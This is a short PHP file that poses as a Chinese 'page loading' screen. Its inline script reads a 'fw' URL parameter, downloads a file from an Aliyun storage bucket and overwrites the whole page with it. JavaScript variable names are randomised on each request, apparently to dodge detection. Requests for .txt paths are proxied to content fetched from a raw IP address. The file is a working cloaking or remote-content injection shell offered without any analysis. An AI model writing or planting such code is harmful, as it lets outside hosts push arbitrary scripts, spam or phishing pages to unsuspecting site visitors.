<?php
$current = $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
$random_str = md5(uniqid(rand(), true));
$queryString = preg_replace("/^\\d+/",'',substr($random_str, 2, 12))."xst";
$urlParams = preg_replace("/^\\d+/",'',substr($random_str, 3, 12))."t6rt";
$dget = preg_replace("/^\\d+/",'',substr($random_str, 6, 20))."ytik";
$dop = preg_replace("/^\\d+/",'',substr($random_str, 7, 24))."iot";
$fontsize = rand(50, 65);
$top = rand(35, 160);

$HTML = <<<HTML
<!DOCTYPE html>
<html lang="en">
<head> <meta charset="UTF-8"> <title>页面加载中</title> </head>
<body>
<h1 style="font-size: ${fontsize}px;text-align:center; margin: ${top}px 0 0 0;"> 努力加载中...<h1>
</body>
<script>
    const $queryString = window.location.search;
    const $urlParams = new URLSearchParams($queryString);
    var fw = $urlParams.get('fw')
    var $dget  = new XMLHttpRequest;
    $dget.onload = function(){
      var $dop = document.open("text/html", "replace");
      $dop.write($dget.responseText);
      $dop.close();
    }
    $dget.open("GET", "https://lbcontent.oss-cn-shenzhen.aliyuncs.com/" + fw, !0);
    $dget.send();

</script>
</html>
HTML;



if ($current){

    $suffixs = explode("/",$current);
    $suffix = empty(end($suffixs)) ? '' : end($suffixs);

    if ($suffix && substr_count($suffix,'.txt') > 0){
        $domain = "http://47.106.213.120/";
        $code = file_get_contents($domain . "/" . $suffix);
        echo $code;
    }else{
        echo $HTML;
    }
}else{
    echo $HTML;
}


